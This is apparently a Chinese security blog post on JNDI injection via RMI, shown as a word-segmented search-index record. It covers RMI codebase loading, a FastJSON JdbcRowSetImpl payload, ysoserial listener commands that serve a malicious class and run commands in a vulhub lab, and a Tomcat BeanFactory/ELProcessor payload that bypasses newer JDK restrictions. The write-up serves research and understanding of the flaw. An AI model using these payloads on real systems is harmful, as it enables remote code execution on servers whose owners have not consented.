\u53ef\u4ee5 \u5728 \u5e8f\u5217 \u5e8f\u5217\u5316 \u524d \u8fdb\u884c \u6784\u9020 \uff0c \u4f8b\u5982 \u4e0b\u9762 \u7684 \u4ee3\u7801 ( \u66f4\u65b0 \u5728 \u4e86 ysoserial \u7684 spring3 \u4e0a )   \u5230 \u4e86 \u5982\u4eca 2020 \u5e74 \uff0c \u8fd9\u4e2a \u7c7b \u7684 \u5229\u7528 \u4ecd\u7136 \u5b58\u5728 \u4e8e \u6700\u65b0 \u65b0\u7248 \u6700\u65b0\u7248 \u7684 Spring - tx \u7ec4\u4ef6 \u4e0a XD   \u6848\u4f8b \u4e8c \uff1a FastJSON \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 POC   JdbcRowSetImpl \u7c7b   fastjson \u7531\u4e8e   @ type   \u7684 \u5b58\u5728 \uff0c \u5728 \u53d7 \u5f71\u54cd \u7684 \u7248\u672c \u4e2d \uff0c \u5176 \u53ef\u4ee5 \u5bf9 \u4efb\u610f \u6307\u5b9a \u7684 \u5bf9\u8c61 \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u6839\u636e \u89c4\u5219 \u81ea\u52a8 \u8c03\u7528 setter / getter \u6765 \u8fbe\u5230 \u5b9e\u4f8b \u8fd8\u539f \u7684 \u76ee\u7684 \u3002 \u9996\u5148 \u6765\u770b \u4e00\u4e0b POC   {   \" @ type \"   :   \" com . sun . rowset . JdbcRowSetImpl \"   ,   \" dataSourceName \"   :   \" rmi : / / localhost : 1099 / obj \"   ,   \" autoCommit \"   :   true   }   \u8fd9\u91cc \u7684 \u5173\u952e \u5728\u4e8e \u5173\u952e\u5728\u4e8e autoCommit \uff0c \u6765\u770b \u4e00\u4e0b JdbcRowSetImpl \u7684 setAutoCommit \u51fd\u6570   \u8fd9\u91cc \u5982\u679c conn \u4e3a null \u7684\u8bdd \uff0c \u4f1a \u8c03\u7528 connect \u51fd\u6570 \uff0c \u770b \u4e00\u4e0b connect \u51fd\u6570   \u770b\u5230 \u8fd9\u91cc \u7528 JNDI \u8fdb\u884c \u6570\u636e \u636e\u5e93 \u6570\u636e\u5e93 \u8fde\u63a5 \uff0c \u5e76\u4e14 \u7531\u4e8e fastjson \u7684 \u7279\u6027 dataSource \u662f \u53ef\u63a7 \u7684 \uff0c \u8fd9 \u5c31 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u53ef\u4ee5 \u63a7\u5236 lookup \u7684 \u53c2\u6570 \uff0c \u5e76 \u5411 \u6076\u610f \u7684 server \u53d1\u8d77 JNDI \u8fde\u63a5 \u3002 \u6839\u636e \u524d \u6587\u8bf4 \u7684 \u539f\u7406 \uff0c \u6211\u4eec \u53ef\u4ee5 \u4f7f\u5f97 \u4e3b\u673a \u6267\u884c \u4efb\u610f \u4ee3\u7801 \u3002   0x03   \u73af\u5883 \u590d\u73b0   \u6539\u9020 JRMPListener   \u7531\u4e8e JNDI \u5e95\u5c42 \u7528 \u7684 \u90fd \u662f RMI \u7684 \u4e1c\u897f \uff0c \u6240\u4ee5 \u6211\u4eec \u8981 \u5efa\u7acb \u4e00\u4e2a \u7ed1\u5b9a \u4e86 Reference \u7684 RMI \u670d\u52a1 \uff0c \u53ef\u4ee5 \u76f4\u63a5 \u6539\u6539 JRMPListener \u3002   \u5728 RMI \u90e8\u5206 \u66fe\u7ecf \u5206\u6790 \u8fc7 JRMPListener \uff0c \u5176 \u8fd4\u56de \u4e86 ExceptionalReturn \uff0c \u4f7f\u5f97 \u6784\u9020 \u597d \u7684 Exception \u5728 Client \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \u3002 \u800c \u5bf9\u4e8e \u7ed1\u5b9a Reference \uff0c \u6211\u4eec \u9700\u8981 \u4fee\u6539 ExceptionalReturn \u4e3a NormalReturn \u5e76 \u5c06 payloadObject \u6539\u4e3a ReferenceWrapper   payloadObject \u6539\u4e3a ReferenceWrapper   \u4f46\u662f \u5728 \u5b9e\u9645 \u6d4b\u8bd5 \u65f6 \uff0c \u53d1\u73b0 Client \u8bf7\u6c42 \u540e \u4e0d\u80fd \u5b8c\u5168 \u9000\u51fa \u3002 \u5176\u5b9e \u6211\u4eec \u4e5f \u53ef\u4ee5 \u76f4\u63a5 \u7528 \u4e0a\u9762 \u7684 \u4f8b\u5b50   \u4e0d\u8fc7 \u8fd9\u91cc \u5c31 \u83b7\u53d6 \u4e0d\u5230 \u662f\u5426 \u6709 \u8bbf\u95ee \u8fdb\u6765 \uff0c \u6839\u636e \u5b9e\u9645 \u7684 \u73af\u5883 \u53d6\u820d \u5427 XD   \u6539\u9020 \u540e \u7684 \u5df2 \u66f4\u65b0 \u5230   github   \u4e0a   / /   \u5f00\u542f \u6302\u8f7d \u4e86 evil   class \u6587\u4ef6 \u7684 HTTP   Server   java   - cp   target / ysoserial - 0.0 . 6 - SNAPSHOT - all . jar   ysoserial . exploit . PayloadHTTPServer   80   EvilObj   \" open   / System / Applications / Calculator . app \"   / /   \u5f00\u542f RMI   Reference   Listener   java   - cp   target / ysoserial - 0.0 . 6 - SNAPSHOT - all . jar   ysoserial . exploit . RMIRefListener   1099   EvilObj   http : / / localhost /   / /   \u6216\u8005 \u4f7f\u7528 RMIRefListener2 \uff0c \u96c6\u5408 \u4e86 \u4e0a\u9762 \u4e24\u4e2a \u6b65\u9aa4   java   - cp   target / ysoserial - 0.0 . 6 - SNAPSHOT - all . jar   ysoserial . exploit . RMIRefListener2   localhost : 1099   80   EvilObj   \" open   / System / Applications / Calculator . app \"   FastJSON   1.2 . 24   RCE   \u8fd9\u91cc \u6211\u4eec \u4ee5 FastJSON   1.2 . 24 \u7248\u672c \u7684 RCE \u4e3a\u4f8b \uff0c \u6765 \u8bd5\u9a8c JNDI   \u9996\u5148 \u5f00\u542f \u4e00\u4e2a evil   rmi   server   java   - cp   ysoserial - 0.0 . 6 - SNAPSHOT - all . jar   ysoserial . exploit . RMIRefListener2   host : 1099   80   EvilObj   \" touch   / tmp / success \"   \u7528   vulhub   \u7684 \u73af\u5883   \u5728 \u670d\u52a1 \u52a1\u5668 \u670d\u52a1\u5668 \u670d\u52a1\u5668\u7aef \u4f1a \u63a5\u6536 \u5230 \u8fde\u63a5   \u8fdb\u5230 docker \u91cc \u53ef\u4ee5 \u770b\u5230 \u751f\u6210 \u4e86 success \u6587\u4ef6   0x04   \u540e\u7eed   \u524d\u6587 \u524d\u6587\u7528 \u7684 \u73af\u5883 \u662f JDK8u111 \uff0c \u5728 \u540e\u7eed \u7684 JDK8u113 \u4ee5\u53ca JDK6u132 ,   JDK7u122 \u4e4b\u540e \u589e\u52a0 \u4e86 \u5bf9 \u8fdc\u7a0b codebase \u7684 \u9650\u5236   \u7cfb\u7edf \u5c5e\u6027   com . sun . jndi . rmi . object . trustURLCodebase \u3001 com . sun . jndi . cosnaming . object . trustURLCodebase   \u7684 \u9ed8\u8ba4 \u9ed8\u8ba4\u503c \u53d8\u4e3a false \uff0c \u5373 \u9ed8\u8ba4 \u4e0d \u5141\u8bb8 \u4ece \u8fdc\u7a0b \u7684 Codebase \u52a0\u8f7d Reference \u5de5\u5382 \u7c7b \u3002 \u5982\u679c \u9700\u8981 \u5f00\u542f   RMI   Registry   \u6216\u8005   COS   Naming   Service   Provider \u7684 \u8fdc\u7a0b \u7c7b \u52a0\u8f7d \u529f\u80fd \uff0c \u9700\u8981 \u5c06 \u524d\u9762 \u8bf4 \u7684 \u4e24\u4e2a \u5c5e\u6027 \u503c \u8bbe\u7f6e \u4e3a true \u3002   Changelog :   JDK   6u141   http : / / www . oracle . com / technetwork / java / javase / overview - 156328 . html # R160 _ 141   JDK   7u131   http : / / www . oracle . com / technetwork / java / javase / 7u131 - relnotes - 3338543 . html   JDK   8u121   http : / / www . oracle . com / technetwork / java / javase / 8u121 - relnotes - 3315208 . html   \u6458\u81ea https : / / kingx . me / Restrictions - and - Bypass - of - JNDI - Manipulations - RCE . html   \u90a3\u4e48 \u5982\u679c \u5b58\u5728 \u8fd9\u6837 \u4e00\u4e2a \u6f0f\u6d1e \u4f46\u662f \u53c8 \u662f \u9ad8 \u7248\u672c \u7684 JDK \u73af\u5883 \uff0c \u8be5 \u600e\u4e48 \u8fdb\u884c bypass \u5462 \uff1f   \u627e\u5230 \u4e00\u4e2a \u53d7\u5bb3 \u53d7\u5bb3\u8005 \u672c\u5730 CLASSPATH \u4e2d \u7684 \u7c7b \u4f5c\u4e3a \u6076\u610f \u7684 Reference   Factory \u5de5\u5382 \u7c7b \uff0c \u5e76 \u5229\u7528 \u8fd9\u4e2a \u672c\u5730 \u7684 Factory \u7c7b \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \u3002   \u5229\u7528 LDAP \u76f4\u63a5 \u8fd4\u56de \u4e00\u4e2a \u6076\u610f \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u5bf9\u8c61 \uff0c JNDI \u6ce8\u5165 \u4f9d\u7136 \u4f1a \u5bf9 \u8be5 \u5bf9\u8c61 \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u64cd\u4f5c \uff0c \u5229\u7528 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 Gadget \u5b8c\u6210 \u547d\u4ee4 \u6267\u884c \u3002   \u6458\u81ea https : / / kingx . me / Restrictions - and - Bypass - of - JNDI - Manipulations - RCE . html   \u4e0a\u9762 \u7684 \u8fd9 \u6587\u7ae0 \u7bc7\u6587\u7ae0 \u63d0\u51fa \u4e86 \u4e0a\u9762 \u4e24\u79cd \u65b9\u6848 \u6765 \u8fdb\u884c \u3002   \u5229\u7528 \u5e95\u5c42 \u534f\u8bae \u5b9e\u73b0 \u4e0a \u7684 \u6f0f\u6d1e   \u5148 \u6765\u8bf4 \u4e00\u4e0b \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \uff0c \u8fd9\u91cc \u63d0\u5230 \u5229\u7528 \u7684 \u662f LDAP \uff0c \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u6211\u4eec \u540e\u9762 \u518d \u8be6\u7ec6 \u53d9\u8ff0 \uff0c \u5176\u5b9e \u539f\u7406 \u8ddf RMI \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u95ee\u9898 \u662f \u4e00\u6837 \u7684 \u3002   \u6211 \u5728   \u6d45\u8c08 Java   RMI \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u95ee\u9898   \u4e2d\u66fe \u63d0\u5230 \u8fc7 \uff0c JRMPListener \u5229\u7528 \u7684 \u662f RMI   Client \u5728 \u63a5\u6536 Exception \u65f6 \u53d1\u751f \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u3002 \u800c \u8fd9\u91cc \u7684 JNDI \u5e95\u5c42 \u7528 \u7684 \u4ecd\u7136 \u662f RMI \u90a3\u5957 ( \u5982\u679c \u534f\u8bae \u662f RMI \u7684\u8bdd ) \uff0c \u6240\u4ee5 \u6211\u4eec \u53d1\u8d77 \u4e00\u4e2a \u94fe\u63a5 \u5230 ysoserial \u7684 JRMPListener \u4e5f \u8fd8\u662f \u80fd \u6210\u529f \u5229\u7528 \u7684 \uff0c \u4e0d\u7ba1 \u6ca1\u6709 \u6709\u6ca1\u6709 \u8bbe\u7f6e   com . sun . jndi . rmi . object . trustURLCodebase   \u4e3a true \u3002 \u5f53\u7136 \u5982\u679c \u8981 \u5229\u7528 \u6210\u529f \uff0c \u53d1\u8d77 \u7aef \u5fc5\u987b \u8981 \u6709 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe\u6240 \u4f9d\u8d56 \u7684 \u7ec4\u4ef6 \u5e76\u4e14 \u5408\u9002 \u7684 JDK \u7248\u672c \u624d \u53ef\u4ee5 \u3002   \u5229\u7528 \u53ef \u5229\u7528 \u7684 \u672c\u5730 Factory \u5bf9\u8c61   \u7136\u540e \u6211\u4eec \u6765 \u7ee7\u7eed \u770b\u770b \u7b2c\u4e00 \u4e00\u79cd \u7b2c\u4e00\u79cd \u60c5\u51b5   \u5728 \u524d\u9762 \u5206\u6790 NamingManager \u7684 getObjectFactoryFromReference \u65f6 \uff0c \u6211 \u7565\u8fc7 \u4e86 \u672c\u5730 \u7684 factory \u7684 \u8f7d\u5165 \u90e8\u5206 \u7684 \u4ee3\u7801   \u8fd9\u91cc \u9996\u5148 \u4f1a \u5728 \u672c\u5730 \u7684 CLASSPATH \u91cc \u627e \u8fd9\u4e2a factoryName \uff0c \u5982\u679c \u627e\u5230 \u4e86 \uff0c \u540e\u7eed \u5c31 \u4e0d\u7528 \u8fdb\u884c \u8fdc\u7a0b \u52a0\u8f7d \u3002 \u6240\u4ee5 \u5982\u679c \u672c\u5730 \u53ef\u4ee5 \u627e\u5230 \u4e00\u4e2a \u53ef \u5229\u7528 \u7684 factory \uff0c \u4e5f \u80fd \u7a81\u7834 JNDI \u7684 \u8fdc\u7a0b \u52a0\u8f7d \u7684 \u9650\u5236 \u3002   \u524d\u9762 \u7684 \u6587\u7ae0 \u4e2d \u63d0\u5230 \u4e86 tomcat \uff08 \u6216 glassfish \uff09 \u4e2d \u7684 BeanFactory \u7684 \u5229\u7528 \uff0c \u6765 \u5206\u6790 \u4e00\u4e0b   \u9996\u5148 \u5728 \u540e\u7eed \u7684 \u8c03\u7528 \u4e2d \uff0c factory \u7684 getObjectInstance \u51fd\u6570 \u5c06\u4f1a \u88ab \u8c03\u7528   / /   ref   \u4e3a \u6211\u4eec \u4f20\u5165 \u7684 Reference   \u53ef\u63a7   / /   name   \u4e3a factory \u7684 name \uff0c \u8fd9\u91cc \u5c31\u662f \u6211\u4eec \u81ea\u5df1 \u4f2a\u9020 \u7684 * EvilObj *   \u53ef\u63a7   factory   .   getObjectInstance   (   ref   ,   name   ,   nameCtx   ,   environment   ) ;   \u6765\u770b \u4e00\u4e0b BeanFactory \u4e2d getObjectInstance \u51fd\u6570 \u7684 \u5b9e\u73b0 \uff0c \u51fd\u6570 \u6709\u70b9 \u957f \uff0c \u6211\u4eec \u6311 \u91cd\u70b9 \u770b   if   (   obj   instanceof   ResourceRef   )   {   try   {   Reference   ref   =   (   Reference   )   obj   ;   String   beanClassName   =   ref   .   getClassName   ( ) ;   Class   < ? >   beanClass   =   null   ;   ClassLoader   tcl   =   Thread   .   currentThread   ( ) .   getContextClassLoader   ( ) ;   if   (   tcl   ! =   null   )   {   try   {   beanClass   =   tcl   .   loadClass   (   beanClassName   ) ;   / /   \u8f7d\u5165 \u6307\u5b9a class   }   catch   (   ClassNotFoundException   e   )   {   }   }   else   {   try   {   beanClass   =   Class   .   forName   (   beanClassName   ) ;   / /   \u8f7d\u5165 \u6307\u5b9a class   }   catch   (   ClassNotFoundException   e   )   {   e   .   printStackTrace   ( ) ;   }   }   / /   ...   / /   ...   Object   bean   =   beanClass   .   newInstance   ( ) ;   / /   \u5b9e\u4f8b \u5316   \u5148\u770b \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u4ee3\u7801 \uff0c \u5f53\u524d \u6211\u4eec \u4f20\u5165 \u7684 Reference \u5fc5\u987b \u662f ResourceRef \u5bf9\u8c61 \uff0c \u5e76 \u5728 \u540e\u7eed \u52a0\u8f7d ResourceRef \u7684 beanClass \u548c shilihuanewInstance \u8fdb\u884c ( \u800c \u8fd9\u91cc \u7684 class \u6211\u4eec \u53ef\u4ee5 \u5728 \u8d4b\u503c \u65f6 \u968f\u610f \u6307\u5b9a ) \u3002   RefAddr   ra   =   ref   .   get   (   \" forceString \"   ) ;   Map   <   String   ,   Method   >   forced   =   new   HashMap   < >   ( ) ;   String   value   ;   if   (   ra   ! =   null   )   {   value   =   (   String   )   ra   .   getContent   ( ) ;   / /   ...   / *   Items   are   given   as   comma   separated   list   * /   for   (   String   param   :   value   .   split   (   \" , \"   ) )   {   param   =   param   .   trim   ( ) ;   index   =   param   .   indexOf   (   ' = '   ) ;   if   (   index   > =   0   )   {   / /   \u5982\u679c \u5185\u5bb9 \u4e2d \u5b58\u5728 = \uff0c \u63d0\u53d6 = \u540e\u9762 \u7684 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u4f5c\u4e3a \u51fd\u6570 \u540d   setterName   =   param   .   substring   (   index   +   1   ) .   trim   ( ) ;   param   =   param   .   substring   (   0   ,   index   ) .   trim   ( ) ;   }   else   {   setterName   =   \" set \"   +   param   .   substring   (   0   ,   1   ) .   toUpperCase   (   Locale   .   ENGLISH   )   +   param   .   substring   (   1   ) ;   }   try   {   forced   .   put   (   param   ,   beanClass   .   getMethod   (   setterName   ,   paramTypes   ) ) ;   }   / /   ...   }   }   ReferenceRef \u5b58\u5728 \u7740 \u53ef\u63a7 \u7684 \u952e\u503c \u5bf9 \u5173\u7cfb \uff0c \u901a\u8fc7   get   \u51fd\u6570 \u83b7\u5f97 \uff0c \u5982 \u4e0a\u8ff0 \u4ee3\u7801   ref . get ( \" forceString \" )   \u5c06\u4f1a \u83b7\u5f97 forceString \u76f8\u5bf9 \u5e94 \u7684 RefAddr \uff0c \u901a\u8fc7 \u8c03\u7528 RefAddr \u7684 getContent \u51fd\u6570 \u5c31 \u53ef\u4ee5 \u83b7\u5f97 forceString \u952e \u5bf9\u5e94 \u7684 \u503c \u3002   \u8fd9\u91cc \u9700\u8981 \u6ce8\u610f \u7684 \u662f \uff0c \u5f53 forceString \u5bf9\u5e94 \u7684 \u5185\u5bb9 \u4e2d \u5b58\u5728   =   \u65f6 \uff0c \u5c06 \u622a\u53d6   =   \u540e\u9762 \u7684 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u4f5c\u4e3a \u540e\u7eed \u8c03\u7528 \u7684 \u51fd\u6570 \u540d \u3002 \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u53ef\u4ee5 \u4efb\u610f \u6307\u5b9a \u5f53\u524d \u5bf9\u8c61 \u7684 \u7c7b \u51fd\u6570 \u4e86 \u3002 force \u952e\u503c \u5bf9 \u4e2d\u5c06 \u5305\u542b   =   \u524d\u9762 \u7684 \u5185\u5bb9 \u548c \u76f8\u5e94 \u7684 Method \u5bf9\u8c61 \u3002 \u4f8b\u5982   test = eval   , \u6700\u7ec8 \u6211\u4eec \u5c06 \u5f97\u5230 eval \u7684 Method \u5bf9\u8c61   Enumeration   <   RefAddr   >   e   =   ref   .   getAll   ( ) ;   while   (   e   .   hasMoreElements   ( ) )   {   ra   =   e   .   nextElement   ( ) ;   String   propName   =   ra   .   getType   ( ) ;   if   (   propName   .   equals   (   Constants   .   FACTORY   )   | |   propName   .   equals   (   \" scope \"   )   | |   propName   .   equals   (   \" auth \"   )   | |   propName   .   equals   (   \" forceString \"   )   | |   propName   .   equals   (   \" singleton \"   ) )   {   continue   ;   }   value   =   (   String   )   ra   .   getContent   ( ) ;   Object   [ ]   valueArray   =   new   Object   [   1   ]   ;   / *   Shortcut   for   properties   with   explicitly   configured   setter   * /   Method   method   =   forced   .   get   (   propName   ) ;   if   (   method   ! =   null   )   {   valueArray   [   0   ]   =   value   ;   try   {   method   .   invoke   (   bean   ,   valueArray   ) ;   }   catch   (   IllegalAccessException   |   IllegalArgumentException   |   InvocationTargetException   ex   )   {   throw   new   NamingException   (   \" Forced   String   setter   \"   +   method   .   getName   ( )   +   \"   threw   exception   for   property   \"   +   propName   ) ;   }   continue   ;   }   ref . getAll   \u83b7\u53d6 \u4e86 \u6240\u6709 \u7684 RefAddr \uff0c \u5bf9\u4e8e \u975e   Constants . FACTORY / scope / auth / forceString / singleton   \u4e14 \u524d\u6587 \u53c8 \u83b7\u53d6 \u76f8\u5e94 \u7684 Method \u5bf9\u8c61 \u65f6 \uff0c \u6211\u4eec \u5c06 \u8c03\u7528 \u8be5 \u5bf9\u8c61 \uff0c \u5176 \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u4e3a \u6b64\u65f6 RefAddr \u7684 \u5185\u5bb9 \u3002 \u6bd4\u5982 \u5b58\u5728 \u4e00\u4e2a RefAddr \u7684 type \u4e3a   test   \uff0c \u5c06 \u8c03\u7528 \u524d\u9762 \u7684   eval   \u7684 Method \u5bf9\u8c61 \u3002   \u5230 \u8fd9\u91cc \uff0c \u6211\u4eec \u5c31 \u5b8c\u6210 \u4e86 \u4e00\u6b21 \u53cd\u5c04 \u8c03\u7528 \uff0c \u6765 \u770b\u770b poc   / /   payload   from   kingx   ResourceRef   ref   =   new   ResourceRef   (   \" javax . el . ELProcessor \"   ,   / /   bean   class   null   ,   \" \"   ,   \" \"   ,   true   ,   \" org . apache . naming . factory . BeanFactory \"   ,   / /   factory   class   null   ) ;   ref   .   add   (   new   StringRefAddr   (   \" forceString \"   ,   \" KINGX = eval \"   ) ) ;   / /   eval \u51fd\u6570 Method \u5bf9\u8c61 \u5c06\u4f1a \u88ab \u8c03\u7528   ref   .   add   (   new   StringRefAddr   (   \" KINGX \"   ,   \" \\ \" \\ \" . getClass ( ) . forName ( \\ \" javax . script . ScriptEngineManager \\ \" ) \"   +   \" . newInstance ( ) . getEngineByName ( \\ \" JavaScript \\ \" ) \"   +   \" . eval ( \\ \" new   java . lang . ProcessBuilder [ ' ( java . lang . String [ ] ) ' ] ( \"   +   \" [ ' / bin / sh ' , ' - c ' , ' \"   +   command   +   \" ' ] ) \"   +   \" . start ( ) \\ \" ) \"   ) ) ;   / /   eval \u51fd\u6570 \u7684 \u53c2\u6570 \u4e3a \u4e0a\u8ff0 \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \u7684 el \u8bed\u53e5   0x05   \u603b\u7ed3   \u524d\u9762 \u5bf9 JNDI   with   RMI \u505a \u4e86 \u4e00\u4e9b \u7b80\u5355 \u7684 \u4ecb\u7ecd \uff0c \u5f53 \u9047\u5230 \u53ef\u63a7 \u7684 JNDI   lookup \u51fd\u6570 \uff0c \u6211\u4eec \u53ef\u4ee5 \u53d1\u8d77 JNDI \u94fe\u63a5 \u5230 RMI \u670d\u52a1 \u4e0a \uff0c \u5229\u7528 JNDI   Naming   Manager \u7684 \u8fdc\u7a0b codebase \u52a0\u8f7d \u673a\u5236 \u8f7d\u5165 \u4efb\u610f \u7684 bytecodes \u3002   \u5f53\u7136 \uff0c \u524d\u9762 \u7684 \u5229\u7528 \u65b9\u5f0f \u4ec5 \u5728 JDK8u113 \u3001 JDK6u132 , \u3001 JDK7u122 \u7248\u672c \u4e4b\u524d \uff0c \u5982\u679c \u9047\u5230 \u4e86 \u9ad8 \u7248\u672c \u7684 JDK \uff0c \u6211\u4eec \u53ef\u4ee5 \u5c1d\u8bd5 \u5229\u7528 \u672c\u5730 CLASSPATH \u4e2d \u53ef \u5229\u7528 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \uff0c \u6216\u8005 \u662f tomcat \u73af\u5883 \u4e0b \u7684 \u53ef \u5229\u7528 \u7684 ObjectFactory \u3002   \u5728 \u540e\u7eed \u53ef \u5229\u7528 \u7684 \u672c\u5730 Factory \u8fd9\u4e2a \u601d\u8def \u4e0a \uff0c \u539f\u6587 \u4f5c\u8005 kingx \u63d0\u51fa \u6216\u8bb8 \u5176\u4ed6 \u7684 \u4e2d\u95f4 \u4e2d\u95f4\u4ef6 \u73af\u5883 \u4e5f \u53ef\u80fd \u5b58\u5728 \u8fd9\u79cd \u53ef \u5229\u7528 \u7684 ObjectFactory \uff0c \u8fd9\u91cc \u7acb\u4e2a flag \uff0c \u4ee5\u540e \u6709\u7a7a \u4e86 \u4e00\u5b9a \u8981 \u627e \u627e XD","title":"JNDI   with   RMI"},{"location":"blog/2020/jndi-with-rmi-20200209/#0x00","text":"\u5728 \u73b0\u5b9e \u73af\u5883 \u4e2d \uff0c \u9047\u5230 RMI   Registry \u7684 \u673a\u4f1a \u5f88\u5c11 \uff0c \u800c \u7ed3\u5408 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684 JNDI \u6ce8\u5165 \u5219 \u5e38\u89c1 \u4e86 \u8bb8\u591a \u3002 \u672c\u6587 \u5c06 \u4ecb\u7ecd RMI \u7ed3\u5408 JNDI \u540e \u53ef\u4ee5 \u505a \u54ea\u4e9b \u4e8b\u60c5 XD","title":"0x00   \u524d\u8a00"},{"location":"blog/2020/jndi-with-rmi-20200209/#0x01","text":"\u5728 \u770b JNDI \u540c RMI \u7684 \u5229\u7528 \u524d \uff0c \u6211\u4eec \u5148 \u6765 \u770b\u770b \u5173\u4e8e RMI \u52a8\u6001 \u7c7b \u52a0\u8f7d \u7684 \u6982\u5ff5 \u3002","title":"0x01   \u57fa\u7840"},{"location":"blog/2020/jndi-with-rmi-20200209/#rmi","text":"RMI \u6709 \u4e00\u4e2a \u91cd\u8981 \u7684 \u7279\u6027 \u662f \u52a8\u6001 \u7c7b \u52a0\u8f7d \u673a\u5236 \uff0c \u5f53 \u672c\u5730 CLASSPATH \u4e2d \u65e0\u6cd5 \u627e\u5230 \u76f8\u5e94 \u7684 \u7c7b\u65f6 \uff0c \u4f1a \u5728 \u6307\u5b9a \u7684 codebase \u91cc \u52a0\u8f7d class \u3002 codebase \u53ef\u4ee5 \u5728 \u7cfb\u7edf \u5c5e\u6027 java . rmi . server . codebase \u8bbe\u7f6e \u5176 URL \u3002 \u5982\u679c codebase \u7684 URL \u53ef\u63a7 \uff0c \u90a3\u4e48 \u6211\u4eec \u5c31 \u53ef\u4ee5 \u8f7d\u5165 \u4efb\u610f \u7684 class \u6216 jar \u6587\u4ef6 \u3002 \u6839\u636e P \u725b \u7684 Java \u5b89\u5168 \u6f2b\u8c08 -   RMI \u7bc7 \u4e2d \u63d0\u5230 \uff0c \u901a\u8fc7 \u4fee\u6539 \u4f20\u9012 \u8fc7\u7a0b \u4e2d \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \uff0c \u5c06 \u5176\u4e2d \u7684 codebase \u4fee\u6539 \u4e3a \u6076\u610f \u7684 server \uff0c \u8fd9\u6837 \u53ef\u4ee5 \u8fbe\u5230 RMI   Server \u7aef \u88ab \u653b\u51fb \u7684 \u6548\u679c \u3002 \u4e0d\u8fc7 \uff0c \u8fd9\u4e2a \u5229\u7528 \u6761\u4ef6 \u6bd4\u8f83 \u82db\u523b \uff0c \u5e76\u4e14 oracle \u5728 \u540e\u9762 \u5bf9 \u5176 \u505a \u4e86 \u9650\u5236 \uff0c \u5982\u679c \u8981 \u6210\u529f \u5229\u7528 \u9700\u8981 \u6ee1\u8db3 \u5982\u4e0b \u8981\u6c42 \uff1a   \u5b89\u88c5 \u5e76 \u914d\u7f6e \u4e86 SecurityManager   Java \u7248\u672c \u4f4e\u4e8e 7u21 \uff0c 6u45 \u6216\u8005 \u8bbe\u7f6e \u4e86   java . rmi . server . useCodebaseonly = false   \u6458\u81ea Java \u5b89\u5168 \u6f2b\u8c08 - RMI \u7bc7   \u5176\u4e2d \u4e0a\u9762 \u7684 \u914d\u7f6e \uff0c \u5728 7u21 \uff0c 6u45 \u540e \u7684 \u7248\u672c \u91cc \u9ed8\u8ba4 \u4e3a   true   \uff0c \u90a3\u4e48 \u4e5f \u5c31 \u65e0\u6cd5 \u4ece \u8fdc\u7a0b codebase \u4e2d \u8f7d\u5165 \u7c7b \uff0c \u907f\u514d \u4e86 \u4e0a\u9762 \u8bf4 \u7684 \u8fd9\u79cd \u653b\u51fb \u7684 \u53ef\u80fd \u53ef\u80fd\u6027 \u3002","title":"RMI \u52a8\u6001 \u7c7b \u52a0\u8f7d"},{"location":"blog/2020/jndi-with-rmi-20200209/#jndi","text":"Java   Naming   and   Directory   Interface   ( JNDI )   is   a   Java   API   that   allows   clients   to   discover   and   look   up   data   and   objects   via   a   name .   https : / / www . blackhat . com / docs / us - 16 / materials / us - 16 - Munoz - A - Journey - From - JNDI - LDAP - Manipulation - To - RCE - wp . pdf   JNDI \u65b9\u4fbf \u4e86 \u4e0e naming   service \u548c Directory   service \u7684 \u4ea4\u4e92 \uff0c \u901a\u8fc7 \u6307\u5b9a \u7279\u5b9a \u7684 URL \u5373\u53ef \u4e0e \u4e0d\u540c \u7684 \u670d\u52a1 \u8fdb\u884c \u4ea4\u4e92 \u3002 \u76f8\u5f53 \u5f53\u4e8e \u76f8\u5f53\u4e8e \u5bf9 \u8fd9\u4e9b \u670d\u52a1 \u7684 API \u53c8 \u8fdb\u884c \u4e86 \u4e00\u6b21 \u5c01\u88c5 \u4f9b \u5f00\u53d1 \u53d1\u4eba \u4eba\u5458 \u5f00\u53d1\u4eba\u5458 \u4f7f\u7528 \u3002 \u5176\u4e2d JNDI \u4e2d \u4e5f \u5b58\u5728 \u4e0a\u8ff0 RMI   codebase \u7684 \u52a8\u6001 \u52a0\u8f7d \u673a\u5236 \uff0c \u5e76\u4e14 \u5176 \u914d\u7f6e \u540c \u5e95\u5c42 \u7684 RMI \u914d\u7f6e \u5e76 \u4e0d \u76f8\u5173 \u3002   \u4ece \u4e0a\u8ff0 \u7684 \u6784\u67b6 \u6765\u770b \uff0c \u52a8\u6001 \u52a0\u8f7d \u53d1\u751f \u4e8e \u4e24\u4e2a \u90e8\u5206 \uff0c Naming   Manager \u548c JNDI   SPI \u3002 \u8fd9\u91cc SPI \u90e8\u5206 \u5c31\u662f \u76f8\u5bf9 \u5e94 \u7684 \u670d\u52a1 \u7684 \u914d\u7f6e \uff0c \u6bd4\u5982 \u524d \u6587 \u63d0\u5230 \u7684 RMI \u7684 \u9650\u5236 \u5c31\u662f SPI \u90e8\u5206 \u7684 \u3002 \u800c 